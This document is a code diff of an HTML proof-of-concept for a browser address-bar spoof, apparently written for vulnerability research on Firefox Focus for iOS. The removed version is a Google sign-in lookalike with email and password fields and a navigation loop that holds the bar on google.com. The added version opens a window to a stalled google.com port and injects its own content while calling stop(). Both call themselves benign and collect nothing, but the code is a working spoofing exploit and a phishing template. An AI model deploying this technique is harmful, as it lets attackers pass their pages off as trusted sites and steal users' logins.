@@ -1,42 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE HTML>
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in - Google Accounts</title>
-<style>
-  body{font-family:system-ui,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-  .box{background:#fff;padding:2.5rem;border-radius:8px;box-shadow:0 1px 3px rgba(60,64,67,.3),0 4px 8px rgba(60,64,67,.15);width:100%;max-width:400px;text-align:center;box-sizing:border-box}
-  .in{width:100%;padding:.75rem 1rem;margin-bottom:1.25rem;border:1px solid #dadce0;border-radius:4px;font-size:1rem;box-sizing:border-box}
-  .btn{background:#1a73e8;color:#fff;padding:.75rem 1.5rem;border:0;border-radius:4px;font-size:1rem;font-weight:500;cursor:pointer}
-  .lnk{color:#1a73e8;text-decoration:none;font-weight:500;font-size:.875rem}
-  .row{display:flex;justify-content:space-between;align-items:center;margin-top:1.5rem}
-  .logo{width:74px;margin:0 auto 1.25rem;display:block}
-</style>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Address Bar Spoof PoC v2</title>
 </head>
 <body>
-  <div class="box">
-    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-    <h1 style="font-weight:400;font-size:1.5rem;margin:.2rem 0">Sign in</h1>
-    <p style="color:#5f6368;margin-bottom:1.5rem">Use your Google Account</p>
-    <!-- BENIGN: no submit/collection. -->
-    <form onsubmit="document.body.innerHTML='<h1>SPOOF PoC: content attacker-controlled</h1>';return false;">
-      <input class="in" type="email" placeholder="Email or phone" required>
-      <input class="in" type="password" placeholder="Password" required>
-      <div style="text-align:left;margin-bottom:1.5rem"><a class="lnk" href="#">Forgot password?</a></div>
-      <div class="row"><a class="lnk" href="#">Create account</a><button class="btn" type="submit">Next</button></div>
-    </form>
-  </div>
+  <!-- v2: buka window LANGSUNG ke URL brand yang menggantung, lalu tulis konten
+       penyerang + stop() (varian window.open(brand,'w')). Benign: penanda saja. -->
+  <button id="go" type="button">Open</button>
 
-<script>
-/* Firefox Focus iOS spoof test — keep bar pending on google.com via a /csi (204) LOOP,
-   so the document is never swapped (204) and the bar keeps showing google.com.
-   No invalid-scheme interrupt -> no render abort. Benign. Bounded ~6s. */
-var n = 0, MAX = 50;
-setTimeout(function tick() {
-  try { location.href = 'https://www.google.com/csi?_=' + Date.now(); } catch (e) {}
-  if (++n < MAX) setTimeout(tick, 120);
-}, 700);
-</script>
+  <script>
+  var BRAND = 'http://www.google.com:800';   // port menggantung -> navigasi pending
+  var MARK  = "<h1>This Is Not Facebook !</h1>" +
+              "<p>SPOOF PoC v2 - address bar shows google.com, content attacker-controlled.</p>";
+
+  document.getElementById('go').onclick = function () {
+    var t = window.open(BRAND, 'w' + Date.now());
+    if (!t) { alert('popup diblokir - izinkan popup'); return; }
+
+    // pin: tulis konten + stop() berulang supaya bar tetap google.com & konten bertahan
+    var n = 0;
+    var iv = setInterval(function () {
+      try {
+        t.document.body.innerHTML = MARK;   // tulis ke window yang masih pending
+        t.stop();                            // bekukan navigasi google.com:800
+      } catch (e) { /* cross-origin / sudah commit */ }
+      if (++n >= 8) clearInterval(iv);       // ~8x selama ~4 detik
+    }, 500);
+  };
+  </script>
 </body>
 </html>
